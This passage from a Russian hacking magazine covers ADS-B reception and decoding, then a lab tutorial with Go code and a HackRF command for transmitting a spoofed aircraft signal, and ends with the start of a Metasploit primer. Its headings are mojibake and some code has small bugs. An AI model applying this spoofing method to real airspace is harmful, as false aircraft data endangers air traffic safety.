   его в 15 дБ. Не ставь слишком большую чувс твительность — мощные сиг-
   налы могут повредить радиотракт!
 4. Bandwidth — ширина канала при ема, для ADS-B это 2 МГц.

Пятый параметр — Sample Rate, или частота дис кретизации. Простым язы ком
это количество выборок в секунду, которое дела ет SDR для оциф ровки сиг-
нала. Что это и зачем? На вход SDR пос тупает аналоговый сигнал, а для
работы его нужно оцифровать. Для оцифровки сиг нала нужно делать выборки
через некоторый одинаковый промежуток времени. Чем больше выборок
в секунду, тем лучше, но тем мощ нее для это го должно быть устрой ство. Наг-
лядно про цесс оцифровки показан на кар тинке ниже.





                       Как работает оцифровка

Ко личество стол биков на картинке — это и есть количес тво сем плов, а SPS
в скоб ках в названии это го параметра рас шифровывается как Samples per
Second, то есть количество выборок в секунду. В параметре samp_rate ввер-
ху я задал частоту выборки 4М SPS, и это неслучайное значение, ведь оно
как раз в четыре раза больше частоты вход ного сиг нала, а по теоре ме Най-
квиста нужна минимум в два раза большая час тота, чем час тота сигнала.
Для работы с ADS-B можно использовать и частоты 2 и 2,5 MSPS, но чем
выше частота дис кре тизации, тем луч ше качес тво оцифровки.




                       Теорема Найквиста (она же теорема отсчетов,
                       теорема  Котельникова)  —  фундаментальное
                        утвер ждение в области цифровой обработки сиг-
                         налов, связыва ющее неп рерыв ные и дискрет ные
                         сигналы и гла сящее, что «любую функцию F(t),
                       состоящую из частот от 0 до f1, можно непрерыв-
                      но переда вать с любой точностью при помощи
                         чисел, следующих друг за дру гом менее чем
                       через 1 / (2 * f1) с».


Те перь, когда все нас тро ено, можно нажимать «Старт» на верхней панели
GNU Radio. Если все сде лано вер но, ты увидишь спектр, похожий на тот, что
поймал я.





                Ви зуализация спек тра в GNU Radio

Еле заметные полоски в верхней части скриншота — это и есть сигналы,
которые мы ищем. Мой BladeRF не отка либрован, так что по бокам видны
завалы, но нашему эксперименту они не мешают. Нужно записать несколь ко
минут таких сиг налов, после чего можно сво рачивать обо рудование и идти
домой — декодировать!


Äåìîäóëÿöèÿ
Для демодуляции я собрал в GNU Radio более слож ную и интерес ную схе му.





                    Схема демодуляции сиг нала

Давай пробежимся по каж дому блоку схемы, что бы ты понимал, что про исхо-
дит. На схеме часть вхо дов и выходов имеют раз ные цвета — эти цве та озна-
чают раз ные типы дан ных:
 • си ний — комплексные числа;
 • оранжевый — числа с плавающей точкой;
 • фи олетовые — бай ты.

Те перь перей дем к самим блокам.
 1. File Source — источник сигнала в виде файла. В этом блоке нужно выб рать
   файл, который мы записали, когда принимали сигнал. Этот блок заменяет
   реальную SDR для наших экспе римен тов.
 2. Throttle — элемент, замед ляющий подачу сигнала в нашу схему. Без этого
   блока вся обработ ка выполнится слиш ком быстро и будет ничего не вид-
   но.
 3. Waterfall — это визуали зация сиг нала. Желто-голубая каша из пикселей
   на графике — это как раз оно.
 4. QT GUI Time Sink рисует гра фик зависи мости сиг нала от времени.
 5. Compex To Mag — блок преобра зова ния комплексных чисел в чис ла с пла-
  вающей точкой. На входе у него синие зна чения, а на выходе оранжевые.
 6. Threshold — самый важ ный блок в нашей схеме демодуляции, он помогает
   отделить сигналы от остального шума. Я задал зна чения low 13m и high
   13m — это ампли туды сигналов, которые я хочу отделить.




   Чтобы найти порог для твоей SDR, при дется соб рать еще одну допол-
   нительную схе му. Спра ва в поиске найти блоки Peak Detector и Time Sink.
  В блоке Time Sink нужно выставить три вхо да, а если у Peak Detector
   отсутствует Debug port, то только два. Пос ле сбор ки схемы ты увидишь,
   на какой ампли туде будут пики полез ного сиг нала.


 7. Symbol Sync — это еще один важ ный блок синхро низации символов. Выше
   я уже говорил, что выбрал час тоту дискре тизации 4 MSPS, и нужно это как
   раз для работы бло ка син хро низа ции, пос коль ку  его минимальный
   параметр Samples per Symbol равен 2, а воз можно это, только если час-
   тота дискретизации входного сигнала не меньше 4 MSPS. Если у тебя
   не такой крутой при емник (например, RTL-SDR) — не беда, можно отклю-
   чить Symbol Sync и исполь зовать блок Keep 1 in N (нарисован серым
   на схе ме выше). С блоком синхрониза ции из сырой записи я в своем тесте
   получил 18 из 31 хороших пакетов, а без него — 11 из 29. Получается, что,
   просто используя нормальную синхрониза цию, ты получишь зна читель но
   больше валидных данных.
 8. Float to Char — этот блок пре образует числа с плавающей запятой в сим-
   волы и отправ ляет в File Sink.
 9. File Sink сох раня ет бай ты в файл для дальнейшего ана лиза.

Со схе мой разоб рались, можно ее включать. Пос ле запус ка ты увидишь при-
мерно такую картину.





                   Схема демодуляции в дей ствии

Са мое пер вое — это наш Waterfall, на нем удобно глазами искать сигнал.
Дальше идет Time Sink пос ле син хрониза ции: тут два сигнала — красный (сиг-
нал ошиб ки) и синий (исправленный по времени сигнал). Эти сигналы уже
напоминают что-то циф ровое, но нас тоящий циф ровой сигнал отображается
уже на третьем гра фике (обра ботанный блоком Threshold). Четвертый гра-
фик — это тот же исходный сиг нал, что на пер вом графике, но обработанный
блоком Threshold.


Àíàëèç ôàéëà
Пос ле демодуляции файл будет выг лядеть так.


000717e0: 0000 0100 0100 0000 0000 0001 0000 0000  ................
000717f0: 0101 0000 0100 0000 0000 0101 0000 0100  ................
00071800: 0101 0001 0000 0100 0101 0000 0101 0001  ................
00071810: 0000 0101 0001 0001 0100 0101 0000 0100  ................
00071820: 0100 0100 0100 0101 0001 0001 0001 0000  ................
00071830: 0100 0100 0100 0100 0101 0000 0100 0100  ................
00071840: 0100 0001 0101 0000 0100 0100 0100 0100  ................
00071850: 0100 0100 0100 0100 0100 0100 0100 0100  ................
00071860: 0100 0100 0100 0100 0100 0100 0100 0100  ................
00071870: 0100 0100 0100 0100 0100 0100 0100 0101  ................

Давай теперь прочитаем файл и будем искать в этом потоке данных пре амбу-
лу пакета Mode S. Я написал для это го несколько функций на Python.


import requests


def read_binary_file(filename):
 with open(filename, 'rb') as file:
  return [int(byte) for byte in file.read()]


def find_pattern(data, pattern):
 pattern_length = len(pattern)
 matches = []
 for i in range(len(data) - pattern_length + 1):
  if data[i:i+pattern_length] == pattern:
   matches.append(i)
 return matches

Первая функция просто читает файл, а вто рая ищет заданный паттерн (нашу
пре амбулу). Но для поиска нуж но сначала соб рать двой ные биты в одинарные
(те самые повторения, из-за которых бит по 0,5 мкс занимает 1 мкс). Сле-
дующая функция как раз это и делает:


def decode_adsb(bits):
  decoded = []
  for i in range(0, len(bits), 2):
   if bits[i:i+2] == [1, 0]:
     decoded.append(1)
   elif bits[i:i+2] == [0, 1]:
     decoded.append(0)
  return decoded

Чи таем файл и находим все преамбулы:


data = read_binary_file("decoded2.bin")
pattern = [1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0]
matches = find_pattern(data, pattern)
print("Total matches: ", len(matches))
good = 0
bad = 0

Здесь pattern — это и есть искомая преамбула. Можешь даже отлистать
в начало статьи и сравнить. Пос кольку пре амбу ла означает любой сигнал
Mode S, а не толь ко ADS-B, то могут попадаться сиг налы длиной 56 бит. Их
под держка тоже есть.


for match_index in matches:
 try:
  start_index = match_index + len(pattern)


  end_index = start_index + 224
  end_index2 = start_index + 112


  extracted_bits = data[start_index:end_index]
  extracted_bits2 = data[start_index:end_index2]


  decoded_bits = decode_adsb(extracted_bits)
  decoded_bits2 = decode_adsb(extracted_bits2)


  hex_value = hex(int(''.join(map(str, decoded_bits)), 2)).replace(
'0x','')
  hex_value2 = hex(int(''.join(map(str, decoded_bits2)), 2)).replace(
'0x','')


  if len(hex_value) == 28:
   response = requests.get(f"http://jasonplayne.com:8080/
decode?packet={hex_value}&refLat=&refLon=")
   if "Failed to decode." in response.text:
    bad += 1
   else:
    good += 1
    print(response.text)


  if len(hex_value2) == 14:
   response = requests.get(f"http://jasonplayne.com:8080/
decode?packet={hex_value}&refLat=&refLon=")
   if "Failed to decode." in response.text:
    bad += 1
   else:
    good += 1
    print(response.text)


 except:
  pass
print("Total good/bad: ", good, "/", bad)

Прочитав код, ты заметишь, что я вытаскиваю ADS-B-пакеты и отправ ляю их
для декоди рования на сторонний сер вис, что бы не изобретать собственный
парсер для всех типов пакетов. Этот же сайт мож но открыть и прос то в бра-
узере, что бы полистать образцы пакетов и еще глубже окунуть ся в мир Mode
S и ADS-B.
  При хорошем раскладе ты увидишь примерно такой вывод:


8d89617999086e99b8480ab9e174
MODE S Packet:
Length              : 56 bits
Frame               : 8d89617999086e99b8480ab9e174
DF: Downlink Format : (17) ADS-B
CA: Plane Mode S Cap: (5) Level 2,3 or 4. can set code 7. is airborne
VS: Vertical status : Airborne
AA: ICAO            : 896179


ME : ADSB Msg Type  : (19) Airborne velocity
SUB:      Sub Type  : 1
  Intent Change     : false
  IFR Capable       : false
  Nav Accuracy Cat  : 1
  heading           : 151.88
  Super Sonic?      : No
  velocity          : 232.65
  EW/NS VEL         : (East/west: 109) (North/South: -204)
  Vertical Rate     : -1088
  HAE Delta         : 225 (Height Above Ellipsoid)

Я получил сиг нал со скоростью самолета, но у тебя, конечно, будет их нам-
ного боль ше. DF у меня равен 17 (ADS-B), а ICAO-код транспондера —
896179.
  Надеюсь, и тебе понравилось погружение в интересный мир радиосиг-
налов. Приятных исследова ний!
COVERSTORY





Современные   самоле ты   непрерывно
переда ют друг другу телеметрию по про-
токо лу ADS-B. В этой статье мы с тобой
сде лаем   собствен ный   вообража емый
самолет, чтобы пос мотреть, как работа ет            qeewqq                                                                                  qeewwqqq@gmail.com
переда ча данных. Конечно, будем при этом
соблюдать все законы и пра вила безопас-
ности.


В прош лой статье я уже говорил, что ADS-B — это часть большого протокола
Mode S, который активно использует ся для идентификации и отсле живания
воз душных судов. ADS-B позволяет отслеживать летательные аппараты,
на которых установлен специальный тран спон дер. Он регуляр но переда ет
данные о самоле те: высоту, координаты, скорость и многое другое. Принять
их может любой желающий, так как никакой защиты или шиф рования в про-
токо ле не пре дусмотрено.
  На этот раз мы пол ностью сос редоточимся на передаче своего сиг нала
ADS-B. Что бы никому не помешать, принимать мы его тоже будем на свой
при емник. Учти: это вов се не пособие по оснащению самоле тов транспон-
дерами.  Ско рее  мы  будем  исполь зовать  этот  любопытный  при мер
для демонстрации того, как кто-то может разобрать и под делать любой
незащи щенный сиг нал.




                    Ни при каких обстоятельствах не повторяй все
                        это за пределами своей лаборатории! Работа
                        в эфире без разрешения может повлечь за собой
                         ответствен ность по закону. Автор и редакция
                      не несут ответственности за любой вред, при-
                       чинен ный с примене нием изло женной информа-
                        ции.



ÒÅÑÒÎÂÛÉ ÏÎËÈÃÎÍ

Тестовое окружение необходимо, что бы видеть, что мы дела ем, но при этом
не влиять на оборудо вание аэро портов. Вряд ли они оценят наши экспе-
римен ты! Зато ущерб вполне могут оценить, а сумму выставить к оплате. Что-
бы это го избежать, я взял два SDR и исполь зовал на минимальной мощности
в экранирующем помещении. К тому же сигналы на частотах око ло 1 ГГц,
которые я использовал, практически не распростра няются за горизонт.
  В моем распоряже нии оказались два неп лохих и довольно популярных
SDR: HackRF и BladeRF. Пер вый я буду использовать как передатчик, а вто-
рой — как при емник. Програм мную часть приема сде лаем с помощью уже
зна комой из прош лой статьи программы dump1090, которая умеет парсить
сиг налы Mode S (частью которого и является ADS-B) в реальном времени
и выводить их в читаемом формате.
   Схе ма уста новки будет выг лядеть примерно так.





                       Схема лабора тории

Для стабильной работы на оба SDR нуж но нак рутить любую шты ревую
антенну, так как без нее ничего работать не будет или будет, но очень-очень
пло хо.


Íàñòðîéêà BladeRF
По шаговую настрой ку BladeRF для приема мы уже раз бирали в прошлой
статье. Если ты повторял за мной, то у тебя уже есть утилита dump1090 и нуж-
ная прошив ка в SDR. В таком слу чае этот раздел можно пропустить.
  С заводской прошив кой BladeRF не умеет работать с dump1090 — при-
дет ся их под ружить вруч ную. Первым шагом будет скачивание прошивки, сов-
местимой с ADS-B, с официального сай та разработчика:


wget https://www.nuand.com/fpga/adsbxA4.rbf

Пос ле это го сразу же загружа ем скачанный файл в BladeRF:


bladerf-cli -i adsbxA4.rbf

Дальше нам надо установить еще две прог раммы: bladeRF-adsb и саму
dump1090. Первая нужна прос то для того, чтобы транслировать данные
с SDR напрямую в dump1090.
   Ска чиваем и собираем dump1090:


git clone https://github.com/mutability/dump1090.git
cd dump1090
make
./dump1090 --net-only --raw --interactive

Пос ле запуска dump1090 переходим к мосту:


git clone https://github.com/Nuand/bladeRF-adsb
cd bladeRF-adsb/bladeRF_adsb
wget http://nuand.com/fpga/adsbx40.rbf
wget http://nuand.com/fpga/adsbx115.rbf
make
./bladeRF_adsb

Те перь, когда все готово для приема и декоди рования сигналов ADS-B, уже
можно при нять какие-то сиг налы от самолетов (да, даже в комнате), особен-
но если самолет близко или если у тебя хорошая антенна.


ViralAir
Что бы генери ровать свои сооб щения ADS-B, я создал  утилиту  ViralAir
и выложил ее на GitHub. Чтобы повторять за мной, скачай и ском пилируй ее:


git clone https://github.com/st3rv04ka/ViralAir
cd ViralAir
go build cmd/viralair/main.go

Пос ле сборки появится файл main, который и будет генерировать готовый
для передачи файл. Формат это го файла полностью под ходит для HackRF,
но может быть совместим и с другими SDR (я не про верял). Чтобы проверить,
что все хорошо, можно соз дать тестовый самолет с позывным 0xDEADBE
на высоте 9999 футов следующей командой:


./main -altitude 9999.0 --icao 0xDEADBE

В текущей директории должен появиться файл Samples.iq8s. Если он дей-
ствительно есть, значит, все работа ет и можно про должать.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ



              КАК САМОЛЕТЫ ПЕРЕДАЮТ
                  ДАННЫЕ ПО ADS-B





ÑÒÐÓÊÒÓÐÀ ADS-B

Ïîäãîòîâêà
Давай немного осве жим знания про структуру сооб щения ADS-B из прошлой
статьи. Сообщение может быть раз ной длины — 56 либо 112 бит. От дли ны
зависит тип передаваемой информа ции, а сам тип записывается в поле TC
(Type Code) сооб щения. Обычное 112-битное сообщение выг лядит сле-
дующим образом.




Как ты мог заметить, никакого поля TC тут нет — и все верно, оно спря тано
внутри поля ME. Дело в том, что ADS-B — это все го лишь часть большого
про токо ла Mode S, и выше пред ставлена струк тура именно сооб щения Mode
S, в то вре мя как все спе цифичные для ADS-B поля находят ся внутри поля
данных (ME) Mode S.
  Давай осве жим в памяти назначение остальных полей пакета:
 • DF (downlink format) отвечает за тип сиг нала в Mode S. Для ADS-B всег да
   равен 17;
 • CA (transponder capability) отвечает за тип транспондера, который мы
   теоре тически можем пос тавить какой угодно, но на прак тике будем
   исполь зовать 6 (что означает транспон дер уровня 2+);
 • после CA идет ICAO — уникальный номер самолета. В эти 24 бита мы
  можем запих нуть что угод но, а в рамках этой статьи будем запускать
   самолет 0xDEADBE;
 • ME — само сообщение ABS-B. Это может быть высота, скорость
   или координаты. Мы будем передавать только координаты (TC равен 11),
   без скорос ти и высоты. Скорость и высота ничем не хуже, просто мне
   хочется разобрать подробнее кодирование CPR.


CPR
Возможно, ты читал прошлую статью и еще пом нишь, как я мучился с CPR
и упрощенными картами для переда чи в маленьких сообщениях. Из-за этих
карт в ADS-B есть два вида сооб щений с коор динатами: четное и нечетное, и,
только имея оба сообщения, можно определить точ ную локацию самолета.
Создавать такие пакеты еще слож нее, чем принимать.
  Давай про бежимся по моему коду на Go, который переводит координаты
с CPR:


func nl(declatIn float64) float64 {
  // Близко к полюсам секторов мало, возвращаем всего один
    if math.Abs(declatIn) >= 87.0 {
        return 1.0
    }


    return math.Floor(
        (2.0 * math.Pi) * math.Pow(
            math.Acos(1.0 -
                (1.0-math.Cos(math.Pi/(2.0*latz)))
                / math.Pow(math.Cos((math.Pi/180.0) * math.Abs(
declatIn)), 2)),
        -1))
}


func dlon(declatIn float64, ctype int, surface int) float64 {
    var tmp float64
    if surface == 1 {
        tmp = 90.0
    }
    else
    {
        tmp = 360.0
    }


    nlcalc := math.Max(nl(declatIn)-float64(ctype), 1)
    return tmp / nlcalc
}


// Кодируем в CPR
func CprEncode(lat float64, lon float64, ctype int, surface int) (int
, int) {
    var scalar float64
    if surface == 1 {
        scalar = math.Pow(2, 19)
    } else {
        scalar = math.Pow(2, 17)
    }


    dlati := dlat(ctype, surface)
    yz := math.Floor(scalar*((math.Mod(lat, dlati))/dlati) + 0.5)
    dloni := dlon(lat, ctype, surface)
    xz := math.Floor(scalar*((math.Mod(lon, dloni))/dloni) + 0.5)
    return int(yz) & ((1 << 17) - 1), int(xz) & ((1 << 17) - 1)
}

Да, в этом коде черт ногу сломит, но на самом деле за сложной матема тикой
стоят доволь но простые алго ритмы.
   Начнем по порядку, с фун кции nl(). Она рассчитывает количество зон
на заданной нами широте. Логика простая: чем бли же к полюсам, тем мень-
ше зон задан ного размера поместится на одной широте. Вот так выглядят
реальные зоны в CPR.





                         Кар та зон в CPR

Что бы не морочить себе голову слож ной матема тикой, при широте боль-
ше 87 градусов будем возвращать количество делений рав ное единице.
Формула для расчета взята из официальной документации к протоколу, и в
самом документе она выг лядит довольно страшно.





              Формула для рас чета количества зон

Пос ле nl() идет функция dlon(). Количество делений на широте у нас уже
есть, а теперь нужно рас считать интервал, что бы рав номерно распределить
эти деления по кругу и чтобы все они были одинаковыми. При этом важно учи-
тывать, где находится самолет, — на земле или в воз духе. Если самолет
в воздухе, мы делим 360 на количество интервалов минус тип сооб щения
(even или odd). Полученный результат воз вращается в конце функции. Фун-
кция dlat() делает плюс-минус то же самое для долготы, так что не будем
останав ливать ся на ней отдель но.
   Те перь перейдем к основной фун кции рас чета CPR. После получения
количества зон можно рассчи тать непос редс твен но координаты самоле та.
Для это го учтем множитель, который мож но най ти в документации протокола
                                                                  17(он скрыт глубоко в формулах). Для воздуха он будет равен 2   , а для зем ли —
 192   .





                    Формула для воз духа





                    Формула для зем ли

По лученное после кодирования число нужно сжать до 17 бит, что и делается
при воз врате результатов из функции.


PI
Ес ли ты выдох нул с мыслью, что все сложное уже позади, вды хай обратно!
Вторая слож ность при переда че своих сиг налов — это расчет контрольной
суммы (CRC), или parity bits. Нуж но пос читать и добавить в конец сооб-
щения 24 бита, которые используют ся для про верки целостности сообщения.
Именно на них ори ентируется, например, dump1090. Загвоздка в том, что
формула для расчета выг лядит так.





                    Алгоритм подсчета parity bits

В псев докоде эта фун кция выг лядит при мерно так:


generator = 1111111111111010000001001


# 11 + 3 нулевых байта
data_hex = 8D406B902015A678D4D220[000000]


# 88 бит
data = 1000110101000000011010 1110010000001000000001
       0101101001100111100011 0101001101001000100000
      [000000000000000000000000]  # 24 бита


FOR i FROM 0 TO (112-24):
  IF data[i] IS 1:
    data[i:i+24] = data[i:i+24] XOR generator


remainder = data[-24:]


# Результат: 101010100100101111011010, или AA4BDA в HEX

Ге нератор — это константа, которую нашли спе циально для этого алго ритма
и которая наиболее эффективна. В цик ле мы прос то проходим по всем битам
от 0 до 88 (112 минус 24, потому что последние 24 бита мы сейчас и запол-
няем) и при меняем исключающее ИЛИ с генера тором. Полученные 24 бита
нуж но добавить к нашему сообщению, что бы у нас был законченный пакет
данных. Вот как я это сделал в ViralAir:


const ( GENERATOR = "1111111111111010000001001" )


func Crc(msg string, encode bool) string {
    msgbin := []rune(misc.Hex2bin(msg))
    generator := []int{}


    for _, char := range GENERATOR {
        generator = append(generator, int(char-'0'))
    }


    if encode {
        for i := len(msgbin) - 24; i < len(msgbin); i++ {
            msgbin[i] = '0'
        }
    }


    for i := 0; i < len(msgbin)-24; i++ {
        if msgbin[i] == '1' {
            for j := range generator {
                msgbin[i+j] = rune('0' + (int(msgbin[i+j]-'0') ^
generator[j]))
            }
        }
    }


    reminder := string(msgbin[len(msgbin)-24:])
    return reminder
}

Ре ализация на Go похожа на наш псевдокод, так что раз бирать подробно ее
не буду.


Ñîáèðàåì âñё âìåñòå
Те перь, когда у нас есть все служеб ные фун кции, можно создавать пакет!
Начинается  всё  с  кодиро вания  высоты,  за  это  отвечает  функция
encodeAltModes().


// Encode altitude
func encodeAltModes(alt float64, surface int) int {
    mbit := 0
    qbit := 1
    encalt := int((int(alt) + 1000) / 25)


    var tmp1, tmp2 int


    if surface == 1 {
        tmp1 = (encalt & 0xfe0) << 2
        tmp2 = (encalt & 0x010) << 1
    } else {
        tmp1 = (encalt & 0xff8) << 1
        tmp2 = 0
    }


    return (encalt & 0x0F) | tmp1 | tmp2 | (mbit << 6) | (qbit << 4)
}

В зависи мости от высоты применя ются раз ные делители. Для обычных
самолетов — 25, но есть и другие, нап ример 100. Они нуж ны для самоле тов,
которые летают выше, чем обычные. За выбор делителя отвечает параметр
qbit. Смысл делите ля — указать, какого размера взят интервал для высоты.
  Поскольку указывать высоту в нор маль ных величинах, а не в футах —
это слиш ком просто, авторы протокола придумали делить высоту на интерва-
лы по N футов и указывать номер такого интерва ла, а N — это и есть наш
делитель (сколько футов в одном интерва ле). Делитель в 25 футов для нашего
самолета дает точ ность около 7,6 м.
  По поводу самого qbit документация протоко ла говорит сле дующее:


       This  field  will contain barometric  altitude encoded  in 25  or 100-foot
       increments (as indicated by the Q Bit). All zeroes in this field will indicate«
        that there is no altitude data.                »
То есть если qbit установить в 0, то делитель станет равным 100, что быва ет
полез но, если высота слишком большая и ее сложно уместить в сообщение.
В ViralAir пре дусмотрен только делитель 25, хотя добавить 100 можно доволь-
но лег ко — попробуй реали зовать это сам на досуге!
  Ре зультат работы фун кции для высоты в 9999 футов ты можешь увидеть
ниже:



  2024/01/15 03:40:37 [+] Encode altitude [9999.000000] with the surface
  flag [0]
  2024/01/15 03:40:37 [+] Encoded altitude [0x377]


Следующая задача — создать два сообщения (even и odd), и начнем мы
с even. Первая часть любого сооб щения ADS-B — это его тип. DF (тип сооб-
щения Mode S) для ADS-B всег да равен 17, так что это константа в коде,
а пос ле него идут CA (уровень транспондера) и ICAO (номер самолета). CA
и ICAO мож но задать свои как аргу менты при запуске ViralAir.


// Format + CA + ICAO
dataEven = append(dataEven, byte((format<<3)|ca))
dataEven = append(dataEven, byte((icao>>16)&0xff))
dataEven = append(dataEven, byte((icao>>8)&0xff))
dataEven = append(dataEven, byte((icao)&0xff))

Те перь добавим к фрейму долготу, широту и высоту:


// Even
log.Printf("[+] Encode even frame with lat [%f] and lon [%f]", lat,
lon)
evenLat, evenLon := cpr.CprEncode(lat, lon, 0, surface)
log.Printf("[+] Encoded even frame lat [0x%02x] and lon [0x%02x]",
evenLat, evenLon)


// Odd
log.Printf("[+] Encode odd frame with lat [%f] and lon [%f]", lat,
lon)
oddLat, oddLon := cpr.CprEncode(lat, lon, 1, surface)
log.Printf("[+] Encoded odd frame lat [0x%02x] and lon [0x%02x]",
oddLat, oddLon)

При запуске программы закодированные значения выводят ся в кон соль:



  ./main -altitude 9999.0 -icao 0xDEADBE -latitude 11.33 -longitude 11.22
  <...>
  2024/01/15 03:40:37 [+] Encode even frame with lat [11.330000] and lon
  [11.220000]
  2024/01/15 03:40:37 [+] Encoded even frame lat [0x1c6d4] and lon
  [0x19d86]
  2024/01/15 03:40:37 [+] Encode odd frame with lat [11.330000] and lon
  [11.220000]
  2024/01/15 03:40:37 [+] Encoded odd frame lat [0x1b6b6] and lon
  [0x18d91]
  <...>


Бай ты для обо их пакетов готовы, добав ляем их к нашему фрейму:


// Lat + Lot + Alt (even)
dataEven = append(dataEven, byte((tc<<3)|(ss<<1)|nicsb))
dataEven = append(dataEven, byte((encAlt>>4)&0xff))
dataEven = append(dataEven, byte((encAlt&0xf)<<4|(time<<3)|(ff<<2)|(
evenLat>>15)))
dataEven = append(dataEven, byte((evenLat>>7)&0xff))
dataEven = append(dataEven, byte(((evenLat&0x7f)<<1)|(evenLon>>16)))
dataEven = append(dataEven, byte((evenLon>>8)&0xff))
dataEven = append(dataEven, byte((evenLon)&0xff))

Данные фрейма готовы, осталось дописать к ним кон трольную сум му.


// Convert to hex
var sbEven strings.Builder
for _, b := range dataEven[:11] {
    sbEven.WriteString(fmt.Sprintf("%02x", b))
}


dataEvenString := sbEven.String()
log.Printf("[+] Even frame without CRC [%s]", dataEvenString)


// Calculate CRC
dataEvenCRC := misc.Bin2int(crc.Crc(dataEvenString+"000000", true))
log.Printf("[+] Even data CRC [%02x]", dataEvenCRC)


// Append CRC
dataEven = append(dataEven, byte((dataEvenCRC>>16)&0xff))
dataEven = append(dataEven, byte((dataEvenCRC>>8)&0xff))
dataEven = append(dataEven, byte((dataEvenCRC)&0xff))
log.Printf("[+] Even data [%02x]", dataEven)

Пос ле это го в терминал вывалится полный фрейм Mode S, который можно
использовать как угод но: передать, декодировать онлайн или даже рас-
печатать и повесить на стенку.



  2024/01/15 03:40:37 [+] Even data [8ddeadbe5837738da99d861b04b3]
  2024/01/15 03:40:37 [+] Odd data [8ddeadbe5837776d6d8d9121b103]


От отправ ки сиг нала нас отделяет всего одна мелочь: нужно смодулировать
наш сиг нал.


ÏÅÐÅÄÀ×À

Ìîäóëÿöèÿ
Что бы передать наши байты в эфир, нуж но преобразовать их в формат,
который поймет HackRF. Формат очень прос той: нуж но закоди ровать все бай-
ты в комплексные числа и сохранить их в файл.
  Для ADS-B при меняется манчестерское кодирование, то есть единица
кодируется как 01, а ноль как 10. Чтобы лучше это понять, пос мотри на кар-
тинку ниже.





                       Кодирование битов

То есть нужно двоичное представление каждого байта закодировать по опи-
санной выше схеме — и дело в шляпе. Все это базовые опе рации с чис лами,
которые мож но лег ко сделать на любом языке. Ниже — моя реали зация
на Go.


func Frame1090esPpmModulate(even, odd []byte) []byte {
    var ppm []byte
    for i := 0; i < 48; i++ {
        ppm = append(ppm, 0)
    }


    ppm = append(ppm, 0xA1, 0x40)
    for _, byteVal := range even {
        word16 := misc.Packbits(manchesterEncode(^byteVal))
        ppm = append(ppm, word16[0])
        ppm = append(ppm, word16[1])
    }


    for i := 0; i < 100; i++ {
        ppm = append(ppm, 0)
    }


    ppm = append(ppm, 0xA1, 0x40)
    for _, byteVal := range odd {
        word16 := misc.Packbits(manchesterEncode(^byteVal))
        ppm = append(ppm, word16[0])
        ppm = append(ppm, word16[1])
    }


    for i := 0; i < 48; i++ {
        ppm = append(ppm, 0)
    }


    return ppm
}

Нуж но толь ко не забыть о наличии пре амбу лы — специаль ной последова-
тель нос ти битов в начале фрейма, по которой приемник определяет начало
сообщения. В нашем случае это 0xA1 0х40, что соответствует пре амбу ле
Mode S.
  Полученные биты нужно модули ровать в PPM. Как работа ет PPM и чем
отли чается от других спо собов модуляции, наг лядно видно на картинке ниже.





                         PPM-модуляция

Только вот кодиро вать мы будем не аналоговый сиг нал, а уже готовый циф-
ровой,  то  есть представлять наш  сиг нал  в виде комплексных  чисел.
Углублять ся во все их тонкости мы сей час не станем, пос коль ку для наших
задач нужно толь ко два таких числа, с которыми мы даже не будем произво-
дить никаких расчетов. Ком плексное число состоит из двух компонент (I и Q),
которые для бита с высоким уровнем мы уста новим в мак симальное зна-
чение, а для низ кого — в минимальное:


func GenerateSDROutput(ppm []byte) []byte {
    bits := misc.Unpackbits(ppm)
    var signal []byte
    for _, bit := range bits {
        var I, Q byte
        if bit == 1 {
            I = byte(127)
            Q = byte(127)
        }
        else
        {
            I = 0
            Q = 0
        }
        signal = append(signal, I, Q)
    }


    return signal
}

Те перь записы ваем результат в файл и получаем наш заветный Samples.
iq8s.


Â ýôèð
Ну вот, теперь можешь выдыхать с облегчением. Пос ле сборки тестового
стенда, генерации файла с сигналом и настройки всего оборудования мы
наконец-то можем передать данные о нашем самоле те самим себе!
  Включаем при ем, как описано в начале, и переда ем сигнал через HackRF:



  ~/P/ViralAir (main)> hackrf_transfer -t Samples.iq8s -f 1090000000 -s
  2000000 -x 47 -R
  call hackrf_set_sample_rate(2000000 Hz/2.000 MHz)
  call hackrf_set_hw_sync_mode(0)
  call hackrf_set_freq(1090000000 Hz/1090.000 MHz)
  Stop with Ctrl-C
   3.9 MiB / 1.000 sec =  3.9 MiB/second, average power -6.5 dBfs
   3.9 MiB / 1.000 sec =  3.9 MiB/second, average power -6.5 dBfs
   3.9 MiB / 1.000 sec =  3.9 MiB/second, average power -6.5 dBfs
   4.2 MiB / 1.000 sec =  4.2 MiB/second, average power -6.5 dBfs


Аргумент -t — это файл с сигналом, который мы сгенерирова ли; -f задает
частоту передачи (для ADS-B это 1090 МГц, или 1 090 000 000 Гц), а -s —
частоту дискре тизации. Пос ледние два аргу мента отвечают за мощность
передачи и ее зацик ливание. Зачем зацик ливать? Ведь у нас всего два сооб-
щения, и сразу после окон чания переда чи они пропадут из окна dump1090.
  Давай теперь взглянем на приемник!





                     Вывод dump1090

В таблице виден наш самолет DEADBE! Он летит на высоте 9975 футов (ска-
зывается неточность кодирования высоты), и его даже можно найти на карте.





Прямо сей час он летит за тобой где-то над Нигерией.
ВЗЛОМ





В этой статье мы погово рим о Metasploit
Framework (MSF) так, буд то ты о нем впер-
вые  слышишь  и  хочешь  разобраться
с самого начала. Посмотрим, что это вооб-
ще такое и зачем нужно, изучим вхо дящие               Sphinx                                                                                 Джуниор пентестер
в него инструменты и научимся ими поль-           @Logovo_Sphinxa
зоваться. В общем,  это  статья самого
начального  уров ня,  которых  в  «Хакере»
мно гим читате лям не хватает.




                        Статья имеет озна комительный характер и пред-
                       назна чена    для    обу чения    спе циалистов
                      по безопас ности. Автор и редак ция не несут
                         ответствен ности за любой вред, при чиненный
                        с при менением изложенной информации. Рас-
                       простра нение вредоносных программ, наруше-
                      ние работы систем и нарушение тайны переписки
                      прес ледуются по закону.



×ÒÎ ÒÀÊÎÅ METASPLOIT

Ес ли ты занимался прог раммированием, то наверняка знаешь, что фрей-
мворк — это что-то вро де каркаса, на основе которого мож но раз работать
про дукт. Но это не сов сем наш случай.
   Да, Metasploit можно дополнять, но глав ная его фишка в том, что это, счи-
тай, готовый набор экспло итов с удоб ной обо лочкой. Запускаем, ищем нуж-
ный нам экс пло ит, акти вируем его, а дальше — по ситуации. Если он сра-
ботал, то, счастли вые, бежим повышать привилегии или выкачивать важ ные
